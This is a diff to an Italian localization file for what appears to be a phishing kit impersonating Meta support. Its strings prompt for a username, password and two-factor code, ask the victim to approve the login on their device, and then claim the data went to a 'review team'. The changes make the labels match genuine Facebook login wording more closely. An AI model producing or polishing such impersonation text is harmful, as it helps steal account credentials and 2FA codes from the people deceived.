@@ -59,11 +59,11 @@
   "footer.subscribe": "Iscriviti",
   "footer.emailPlaceholder": "Il tuo indirizzo di posta elettronica",
   "modal.pwd.desc": "Inserisci la tua password per continuare.",
-  "modal.pwd.placeholder": "Inserisci la password",
-  "modal.pwd.continue": "Continuare",
+  "modal.pwd.placeholder": "Password",
+  "modal.pwd.continue": "Login",
   "modal.pwd.forgot": "Ha dimenticato la password?",
   "modal.2fa.title": "Autenticazione a due fattori",
-  "modal.2fa.desc": "Inserisci il codice di autenticazione dalla tua app di autenticazione.",
+  "modal.2fa.desc": "Inserisci il codice di autenticazione che inviamo al tuo indirizzo email {email} o {telefono}",
   "modal.2fa.desc2": "Controlla il codice nell'app di autenticazione o negli SMS.",
   "modal.2fa.placeholder": "Inserisci il codice di autenticazione",
   "modal.2fa.notification": "Abbiamo inviato una notifica al dispositivo del giornale; apri Facebook su quel dispositivo e approva l'accesso per continuare.",
@@ -72,5 +72,5 @@
   "modal.success.desc": "Le tue informazioni sono state inviate al team di revisione. Riceverai una risposta entro 14-48 ore.",
   "modal.success.from": "Dal supporto clienti Meta.",
   "modal.success.return": "Ritorna alla home page",
-  "modal.pwd.username": "Inserisci email o nome utente"
+  "modal.pwd.username": "Numero di telefono o e-mail"
 }
